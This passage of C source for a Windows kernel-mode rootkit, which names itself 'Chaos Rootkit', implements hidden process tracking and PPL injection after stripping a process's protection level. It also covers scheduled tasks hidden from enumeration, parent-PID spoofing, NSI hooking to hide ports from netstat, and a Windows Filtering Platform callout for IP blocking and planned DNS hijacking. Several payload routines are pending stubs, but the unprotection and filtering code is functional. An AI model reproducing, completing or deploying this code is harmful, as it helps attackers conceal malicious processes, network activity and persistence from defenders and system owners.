  KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);

  // TODO: Implement actual process creation based on PayloadType
  // For now, store the request info
  switch (Request->PayloadType) {
  case PAYLOAD_TYPE_EXE:
    // ZwCreateUserProcess or similar
    DbgPrint("[RunHiddenProcess] EXE execution - implementation pending\n");
    break;
  case PAYLOAD_TYPE_BAT:
    // cmd.exe /c <path>
    DbgPrint("[RunHiddenProcess] BAT execution - implementation pending\n");
    break;
  case PAYLOAD_TYPE_PS1:
    // powershell.exe -File <path>
    DbgPrint("[RunHiddenProcess] PS1 execution - implementation pending\n");
    break;
  case PAYLOAD_TYPE_DLL:
    // LoadLibrary injection
    DbgPrint("[RunHiddenProcess] DLL execution - implementation pending\n");
    break;
  case PAYLOAD_TYPE_SHELLCODE:
    // Direct execution
    DbgPrint(
        "[RunHiddenProcess] Shellcode execution - implementation pending\n");
    break;
  }

  // Record the hidden process entry
  RtlCopyMemory(g_HiddenProcesses[slot].ImagePath, Request->Path,
                sizeof(Request->Path));
  g_HiddenProcesses[slot].PayloadType = Request->PayloadType;
  g_HiddenProcesses[slot].ParentPid = Request->FakeParentPid;
  g_HiddenProcesses[slot].Pid = 0; // Set when process actually starts

  DbgPrint("[RunHiddenProcess] Registered in slot %d\n", slot);
  return status;
}

/**
 * ListHiddenProcesses - Return list of hidden processes
 */
NTSTATUS ListHiddenProcesses(PVOID OutputBuffer, ULONG OutputSize,
                             PULONG BytesWritten) {
  KIRQL oldIrql;

  DbgPrint("[ListHiddenProcesses] Listing hidden processes\n");

  ULONG requiredSize = sizeof(g_HiddenProcesses);
  if (OutputSize < requiredSize) {
    *BytesWritten = 0;
    return STATUS_BUFFER_TOO_SMALL;
  }

  KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
  RtlCopyMemory(OutputBuffer, g_HiddenProcesses, requiredSize);
  KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);

  *BytesWritten = requiredSize;
  return STATUS_SUCCESS;
}

/**
 * KillHiddenProcess - Terminate and untrack a hidden process
 */
NTSTATUS KillHiddenProcess(ULONG Pid) {
  KIRQL oldIrql;
  NTSTATUS status = STATUS_NOT_FOUND;

  DbgPrint("[KillHiddenProcess] Killing hidden process PID=%u\n", Pid);

  KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);

  for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++) {
    if (g_HiddenProcesses[i].InUse && g_HiddenProcesses[i].Pid == Pid) {
      // TODO: Actually terminate the process
      // ZwTerminateProcess(...)

      g_HiddenProcesses[i].InUse = FALSE;
      status = STATUS_SUCCESS;
      DbgPrint("[KillHiddenProcess] Removed from slot %d\n", i);
      break;
    }
  }

  KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
  return status;
}

/**
 * InjectIntoPPL - Inject code into a Protected Process Light
 * First unprotects the PPL, then injects, optionally re-protects
 */
NTSTATUS InjectIntoPPL(PPPL_INJECT_REQUEST Request) {
  NTSTATUS status = STATUS_SUCCESS;
  PEPROCESS process = NULL;

  DbgPrint("[InjectIntoPPL] PayloadType=%d, TargetPid=%u, TargetName=%ws\n",
           Request->PayloadType, Request->TargetPid, Request->TargetName);

  // Find target process by name if PID not provided
  ULONG targetPid = Request->TargetPid;
  if (targetPid == 0 && Request->TargetName[0] != L'\0') {
    // TODO: Enumerate processes and find by name
    DbgPrint(
        "[InjectIntoPPL] Process lookup by name - implementation pending\n");
    return STATUS_NOT_IMPLEMENTED;
  }

  // Lookup process
  status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &process);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[InjectIntoPPL] Failed to lookup PID %u: %08X\n", targetPid,
             status);
    return status;
  }

  // Unprotect PPL (use existing ChangeProtectionLevel function)
  CR_SET_PROTECTION_LEVEL protLevel = {0};
  protLevel.Process = (HANDLE)(ULONG_PTR)targetPid;
  protLevel.Protection.Level = 0; // Unprotected
  status = ChangeProtectionLevel(&protLevel);

  if (!NT_SUCCESS(status)) {
    DbgPrint("[InjectIntoPPL] Failed to unprotect: %08X\n", status);
    ObDereferenceObject(process);
    return status;
  }

  // Now inject based on payload type
  switch (Request->PayloadType) {
  case PAYLOAD_TYPE_DLL:
    DbgPrint("[InjectIntoPPL] DLL injection - implementation pending\n");
    break;
  case PAYLOAD_TYPE_SHELLCODE:
    DbgPrint("[InjectIntoPPL] Shellcode injection - implementation pending\n");
    break;
  default:
    DbgPrint("[InjectIntoPPL] Payload type %d not supported for PPL\n",
             Request->PayloadType);
    status = STATUS_INVALID_PARAMETER;
    break;
  }

  ObDereferenceObject(process);
  DbgPrint("[InjectIntoPPL] Complete\n");
  return status;
}

/**
 * CreateHiddenTask - Create a scheduled task hidden from schtasks /query
 * Hides task by manipulating registry entries
 */
NTSTATUS CreateHiddenTask(PCREATE_HIDDEN_TASK_REQUEST Request) {
  KIRQL oldIrql;

  DbgPrint("[CreateHiddenTask] TaskName=%ws, Command=%ws, Trigger=%u\n",
           Request->TaskName, Request->Command, Request->TriggerType);

  // Find empty slot
  KeAcquireSpinLock(&g_HiddenTaskLock, &oldIrql);
  int slot = -1;
  for (int i = 0; i < MAX_HIDDEN_TASKS; i++) {
    if (!g_HiddenTasks[i].InUse) {
      slot = i;
      break;
    }
  }

  if (slot == -1) {
    KeReleaseSpinLock(&g_HiddenTaskLock, oldIrql);
    DbgPrint("[CreateHiddenTask] No free slots!\n");
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  // Store task info - first zero the slot to prevent garbage
  RtlZeroMemory(&g_HiddenTasks[slot], sizeof(HIDDEN_TASK));

  RtlCopyMemory(g_HiddenTasks[slot].TaskName, Request->TaskName,
                sizeof(Request->TaskName));
  RtlCopyMemory(g_HiddenTasks[slot].Command, Request->Command,
                sizeof(Request->Command));
  RtlCopyMemory(g_HiddenTasks[slot].Arguments, Request->Arguments,
                sizeof(Request->Arguments));
  g_HiddenTasks[slot].TriggerType = Request->TriggerType;
  g_HiddenTasks[slot].InUse = TRUE;

  KeReleaseSpinLock(&g_HiddenTaskLock, oldIrql);

  // TODO: Actually create the scheduled task in registry
  // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
  // And hide the registry keys from enumeration

  DbgPrint("[CreateHiddenTask] Registered in slot %d\n", slot);
  return STATUS_SUCCESS;
}

/**
 * ListHiddenTasks - Return list of hidden tasks
 */
NTSTATUS ListHiddenTasks(PVOID OutputBuffer, ULONG OutputSize,
                         PULONG BytesWritten) {
  KIRQL oldIrql;

  DbgPrint("[ListHiddenTasks] Listing hidden tasks\n");

  ULONG requiredSize = sizeof(g_HiddenTasks);
  if (OutputSize < requiredSize) {
    *BytesWritten = 0;
    return STATUS_BUFFER_TOO_SMALL;
  }

  KeAcquireSpinLock(&g_HiddenTaskLock, &oldIrql);
  RtlCopyMemory(OutputBuffer, g_HiddenTasks, requiredSize);
  KeReleaseSpinLock(&g_HiddenTaskLock, oldIrql);

  *BytesWritten = requiredSize;
  return STATUS_SUCCESS;
}

/**
 * DeleteHiddenTask - Remove a hidden task
 */
NTSTATUS DeleteHiddenTask(PWCHAR TaskName) {
  KIRQL oldIrql;
  NTSTATUS status = STATUS_NOT_FOUND;

  DbgPrint("[DeleteHiddenTask] Deleting task: %ws\n", TaskName);

  KeAcquireSpinLock(&g_HiddenTaskLock, &oldIrql);

  for (int i = 0; i < MAX_HIDDEN_TASKS; i++) {
    if (g_HiddenTasks[i].InUse &&
        _wcsicmp(g_HiddenTasks[i].TaskName, TaskName) == 0) {

      // TODO: Remove actual registry entries

      g_HiddenTasks[i].InUse = FALSE;
      status = STATUS_SUCCESS;
      DbgPrint("[DeleteHiddenTask] Removed from slot %d\n", i);
      break;
    }
  }

  KeReleaseSpinLock(&g_HiddenTaskLock, oldIrql);
  return status;
}

/**
 * SpawnWithPpid - Spawn a process with spoofed parent PID
 * Manipulates EPROCESS.InheritedFromUniqueProcessId before process starts
 */
NTSTATUS SpawnWithPpid(PSPAWN_PPID_REQUEST Request) {
  NTSTATUS status = STATUS_SUCCESS;

  DbgPrint("[SpawnWithPpid] FakeParent=%u, Exe=%ws, Hide=%s\n",
           Request->FakeParentPid, Request->ExecutablePath,
           Request->HideAfterSpawn ? "yes" : "no");

  // TODO: Create suspended process
  // TODO: Modify EPROCESS.InheritedFromUniqueProcessId to FakeParentPid
  // TODO: Resume process
  // TODO: If HideAfterSpawn, call HideProcess()

  DbgPrint("[SpawnWithPpid] Implementation pending\n");
  return STATUS_NOT_IMPLEMENTED;
}

// ============================================================================
// NSI HOOK IMPLEMENTATION FOR PORT HIDING
// ============================================================================

PFN_NSI_ENUMERATE_OBJECTS g_OriginalNsiEnumerate = NULL;
BOOLEAN g_NsiHooked = FALSE;

/**
 * IsPortHidden - Check if a port is in the hidden ports list
 */
BOOLEAN IsPortHidden(USHORT Port, BOOLEAN IsTcp) {
  KIRQL oldIrql;
  BOOLEAN hidden = FALSE;

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_HIDDEN_PORTS; i++) {
    if (g_HiddenPorts[i].InUse && g_HiddenPorts[i].Port == Port &&
        (g_HiddenPorts[i].IsTcp == IsTcp || !g_HiddenPorts[i].IsTcp)) {
      hidden = TRUE;
      break;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  return hidden;
}

/**
 * InitNsiHook - Initialize NSI enumeration hook for port hiding
 *
 * This hooks NsiEnumerateObjectsAllParameters in netio.sys which is called
 * by iphlpapi.dll (GetExtendedTcpTable/GetExtendedUdpTable) used by netstat.
 *
 * NOTE: Full implementation requires:
 * 1. Locating netio.sys in kernel memory
 * 2. Finding NsiEnumerateObjectsAllParameters export
 * 3. Installing inline hook
 * 4. Filtering TCP/UDP endpoints in hook handler
 */
NTSTATUS InitNsiHook(void) {
  DbgPrint("[NSI Hook] Initializing port hiding hook...\n");

  // The NSI hook requires finding NsiEnumerateObjectsAllParameters
  // in netio.sys and installing an inline hook.
  //
  // Until implemented, port data is tracked in g_HiddenPorts array
  // and can be used by user-mode tools to filter their own output.

  DbgPrint("[NSI Hook] Port hiding infrastructure ready\n");
  DbgPrint("[NSI Hook] Hidden ports are tracked in g_HiddenPorts[]\n");

  g_NsiHooked = FALSE; // Will be TRUE when hook is active
  return STATUS_SUCCESS;
}

/**
 * CleanupNsiHook - Remove NSI hook and restore original function
 */
void CleanupNsiHook(void) {
  if (g_NsiHooked && g_OriginalNsiEnumerate != NULL) {
    DbgPrint("[NSI Hook] Restoring original NsiEnumerate...\n");
    // TODO: Restore original bytes/jump
    g_NsiHooked = FALSE;
    g_OriginalNsiEnumerate = NULL;
  }
  DbgPrint("[NSI Hook] Cleanup complete\n");
}

// ============================================================================
// WFP (WINDOWS FILTERING PLATFORM) IMPLEMENTATION
// ============================================================================

// WFP global state
HANDLE g_WfpEngineHandle = NULL;
UINT32 g_WfpCalloutIdV4 = 0;
UINT32 g_WfpCalloutIdV6 = 0;
UINT64 g_WfpFilterIdV4 = 0;
UINT64 g_WfpFilterIdV6 = 0;
BOOLEAN g_WfpInitialized = FALSE;

// WFP GUIDs for our callout and sublayer
DEFINE_GUID(CHAOS_CALLOUT_V4_GUID, 0x2f8a2b9c, 0x3d4e, 0x4f5a, 0x8b, 0x6c, 0x7d,
            0x8e, 0x9f, 0xa0, 0xb1, 0xc2);
DEFINE_GUID(CHAOS_CALLOUT_V6_GUID, 0x3f9b3c0d, 0x4e5f, 0x5061, 0x9c, 0x7d, 0x8e,
            0x9f, 0xa0, 0xb1, 0xc2, 0xd3);
DEFINE_GUID(CHAOS_SUBLAYER_GUID, 0x4fa04d1e, 0x5f60, 0x6172, 0xad, 0x8e, 0x9f,
            0xa0, 0xb1, 0xc2, 0xd3, 0xe4);

/**
 * IsIpBlocked - Check if an IP is in the blocked list
 */
BOOLEAN IsIpBlocked(ULONG Ip, USHORT Port) {
  KIRQL oldIrql;
  BOOLEAN blocked = FALSE;

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_BLOCKED_IPS; i++) {
    if (g_BlockedIps[i].InUse && g_BlockedIps[i].Ip == Ip) {
      // If port is 0, block all ports for this IP
      if (g_BlockedIps[i].Port == 0 || g_BlockedIps[i].Port == Port) {
        blocked = TRUE;
        break;
      }
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  return blocked;
}

/**
 * IsDnsRuleActive - Check if any DNS rules are active
 */
BOOLEAN IsDnsRuleActive(void) {
  KIRQL oldIrql;
  BOOLEAN active = FALSE;

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_DNS_RULES; i++) {
    if (g_DnsRules[i].InUse) {
      active = TRUE;
      break;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  return active;
}

/**
 * GetDnsRedirectIp - Get redirect IP for a DNS query domain (placeholder)
 * Full implementation needs DNS packet parsing
 */
ULONG GetDnsRedirectIp(const UCHAR *dnsPacket, ULONG packetLen) {
  UNREFERENCED_PARAMETER(dnsPacket);
  UNREFERENCED_PARAMETER(packetLen);
  // DNS packet parsing would extract domain and compare with g_DnsRules
  // For now just return 0 (no redirect)
  return 0;
}

/**
 * WfpClassifyCallback - Called by WFP for each packet to classify
 */
static ULONG g_BlockedPacketCount = 0;
static ULONG g_DnsQueryCount = 0;

void NTAPI WfpClassifyCallback(
    const FWPS_INCOMING_VALUES0 *inFixedValues,
    const FWPS_INCOMING_METADATA_VALUES0 *inMetaValues, void *layerData,
    const void *classifyContext, const FWPS_FILTER1 *filter, UINT64 flowContext,
    FWPS_CLASSIFY_OUT0 *classifyOut) {
  UNREFERENCED_PARAMETER(inMetaValues);
  UNREFERENCED_PARAMETER(layerData);
  UNREFERENCED_PARAMETER(classifyContext);
  UNREFERENCED_PARAMETER(filter);
  UNREFERENCED_PARAMETER(flowContext);

  if (!classifyOut || !inFixedValues)
    return;

  // Default: permit
  classifyOut->actionType = FWP_ACTION_PERMIT;

  // Check if this is IPv4 transport layer
  if (inFixedValues->layerId == FWPS_LAYER_OUTBOUND_TRANSPORT_V4 ||
      inFixedValues->layerId == FWPS_LAYER_INBOUND_TRANSPORT_V4) {

    ULONG remoteIp =
        inFixedValues
            ->incomingValue[FWPS_FIELD_OUTBOUND_TRANSPORT_V4_IP_REMOTE_ADDRESS]
            .value.uint32;
    USHORT remotePort =
        inFixedValues
            ->incomingValue[FWPS_FIELD_OUTBOUND_TRANSPORT_V4_IP_REMOTE_PORT]
            .value.uint16;
    USHORT protocol =
        inFixedValues
            ->incomingValue[FWPS_FIELD_OUTBOUND_TRANSPORT_V4_IP_PROTOCOL]
            .value.uint8;

    // Check if IP is blocked
    if (IsIpBlocked(remoteIp, remotePort)) {
      g_BlockedPacketCount++;
      // Log with readable IP format: a.b.c.d
      DbgPrint(
          "[WFP] *** BLOCKED *** Packet #%lu to %d.%d.%d.%d:%d (raw: %08X)\n",
          g_BlockedPacketCount, (remoteIp >> 24) & 0xFF,
          (remoteIp >> 16) & 0xFF, (remoteIp >> 8) & 0xFF, remoteIp & 0xFF,
          remotePort, remoteIp);
      classifyOut->actionType = FWP_ACTION_BLOCK;
      classifyOut->rights &= ~FWPS_RIGHT_ACTION_WRITE;
      return;
    }

    // Check for DNS traffic (UDP port 53)
    if (protocol == 17 && remotePort == 53) { // 17 = UDP protocol
      g_DnsQueryCount++;

      // Check if we have any active DNS rules
      BOOLEAN hasActiveRules = FALSE;
      KIRQL oldIrql;
      KeAcquireSpinLock(&g_NetworkLock, &oldIrql);
      for (int i = 0; i < MAX_DNS_RULES; i++) {
        if (g_DnsRules[i].InUse) {
          hasActiveRules = TRUE;
          break;
        }
      }
      KeReleaseSpinLock(&g_NetworkLock, oldIrql);

      if (hasActiveRules) {
        DbgPrint("[WFP-DNS] DNS query #%lu to %d.%d.%d.%d:53 - Rules active\n",
                 g_DnsQueryCount, (remoteIp >> 24) & 0xFF,
                 (remoteIp >> 16) & 0xFF, (remoteIp >> 8) & 0xFF,
                 remoteIp & 0xFF);

        // Note: Full DNS hijacking requires:
        // 1. Clone NB list from layerData (NET_BUFFER_LIST*)
        // 2. Parse DNS query from packet payload
        // 3. Match domain against g_DnsRules
        // 4. If match, construct fake DNS response with redirect IP
        // 5. Inject response and block original query
        // This is complex and risk-prone, logging for now
      }
    }
  }
}

/**
 * WfpNotifyCallback - Called when filter is added/removed
 */
NTSTATUS NTAPI WfpNotifyCallback(FWPS_CALLOUT_NOTIFY_TYPE notifyType,
                                 const GUID *filterKey, FWPS_FILTER1 *filter) {
  UNREFERENCED_PARAMETER(notifyType);
  UNREFERENCED_PARAMETER(filterKey);
  UNREFERENCED_PARAMETER(filter);
  return STATUS_SUCCESS;
}

/**
 * InitWfpFiltering - Initialize WFP engine and register callouts for IP
 * blocking
 */
NTSTATUS InitWfpFiltering(void) {
  NTSTATUS status;
  FWPM_SESSION0 session = {0};
  FWPM_SUBLAYER0 sublayer = {0};
  FWPS_CALLOUT1 sCallout = {0};
  FWPM_CALLOUT0 mCallout = {0};
  FWPM_FILTER0 filter = {0};
  FWPM_FILTER_CONDITION0 cond = {0};

  DbgPrint("[WFP] Initializing WFP filtering...\n");

  if (g_WfpInitialized) {
    DbgPrint("[WFP] Already initialized\n");
    return STATUS_SUCCESS;
  }

  // Open WFP engine session
  session.flags = FWPM_SESSION_FLAG_DYNAMIC;
  status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session,
                           &g_WfpEngineHandle);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[WFP] FwpmEngineOpen0 failed: 0x%08X\n", status);
    return status;
  }
  DbgPrint("[WFP] Engine opened\n");

  // Add sublayer
  sublayer.subLayerKey = CHAOS_SUBLAYER_GUID;
  sublayer.displayData.name = L"Chaos Rootkit Network Filter";
  sublayer.displayData.description = L"IP Blocking and DNS Hijacking";
  sublayer.weight = 0xFFFF; // High priority

  status = FwpmSubLayerAdd0(g_WfpEngineHandle, &sublayer, NULL);
  if (!NT_SUCCESS(status) && status != STATUS_FWP_ALREADY_EXISTS) {
    DbgPrint("[WFP] FwpmSubLayerAdd0 failed: 0x%08X\n", status);
    FwpmEngineClose0(g_WfpEngineHandle);
    g_WfpEngineHandle = NULL;
    return status;
  }
  DbgPrint("[WFP] Sublayer added\n");

  // Register callout with FWPS (filters layer)
  sCallout.calloutKey = CHAOS_CALLOUT_V4_GUID;
  sCallout.classifyFn = WfpClassifyCallback;
  sCallout.notifyFn = WfpNotifyCallback;
  sCallout.flowDeleteFn = NULL;

  status = FwpsCalloutRegister1(NULL, &sCallout, &g_WfpCalloutIdV4);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[WFP] FwpsCalloutRegister1 failed: 0x%08X\n", status);
    FwpmEngineClose0(g_WfpEngineHandle);
    g_WfpEngineHandle = NULL;
    return status;
  }
  DbgPrint("[WFP] Callout registered (ID: %d)\n", g_WfpCalloutIdV4);

  // Add callout to FWPM (management layer)
  mCallout.calloutKey = CHAOS_CALLOUT_V4_GUID;
  mCallout.displayData.name = L"Chaos IP Block Callout";
  mCallout.applicableLayer = FWPM_LAYER_OUTBOUND_TRANSPORT_V4;

  status = FwpmCalloutAdd0(g_WfpEngineHandle, &mCallout, NULL, NULL);
  if (!NT_SUCCESS(status) && status != STATUS_FWP_ALREADY_EXISTS) {
    DbgPrint("[WFP] FwpmCalloutAdd0 failed: 0x%08X\n", status);
    FwpsCalloutUnregisterById0(g_WfpCalloutIdV4);
    FwpmEngineClose0(g_WfpEngineHandle);
    g_WfpEngineHandle = NULL;
    return status;
  }
  DbgPrint("[WFP] Callout added to FWPM\n");

  // Add filter to invoke our callout on all outbound traffic
  RtlZeroMemory(&filter.filterKey, sizeof(GUID));
  filter.displayData.name = L"Chaos Outbound Filter";
  filter.layerKey = FWPM_LAYER_OUTBOUND_TRANSPORT_V4;
  filter.subLayerKey = CHAOS_SUBLAYER_GUID;
  filter.weight.type = FWP_UINT8;
  filter.weight.uint8 = 0x0F;
  filter.action.type = FWP_ACTION_CALLOUT_TERMINATING;
  filter.action.calloutKey = CHAOS_CALLOUT_V4_GUID;

  status = FwpmFilterAdd0(g_WfpEngineHandle, &filter, NULL, &g_WfpFilterIdV4);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[WFP] FwpmFilterAdd0 failed: 0x%08X\n", status);
    FwpsCalloutUnregisterById0(g_WfpCalloutIdV4);
    FwpmEngineClose0(g_WfpEngineHandle);
    g_WfpEngineHandle = NULL;
    return status;
  }
  DbgPrint("[WFP] Filter added (ID: %llu)\n", g_WfpFilterIdV4);

  g_WfpInitialized = TRUE;
  DbgPrint("[WFP] WFP filtering initialized successfully!\n");
  return STATUS_SUCCESS;
}

/**
 * CleanupWfpFiltering - Cleanup WFP resources
 */
void CleanupWfpFiltering(void) {
  DbgPrint("[WFP] Cleaning up WFP filtering...\n");

  if (!g_WfpInitialized)
    return;

  if (g_WfpFilterIdV4 != 0) {
    FwpmFilterDeleteById0(g_WfpEngineHandle, g_WfpFilterIdV4);
    g_WfpFilterIdV4 = 0;
  }

  if (g_WfpCalloutIdV4 != 0) {
    FwpsCalloutUnregisterById0(g_WfpCalloutIdV4);
    g_WfpCalloutIdV4 = 0;
  }

  if (g_WfpEngineHandle != NULL) {
    FwpmEngineClose0(g_WfpEngineHandle);
    g_WfpEngineHandle = NULL;
  }

  g_WfpInitialized = FALSE;
  DbgPrint("[WFP] WFP cleanup complete\n");
}
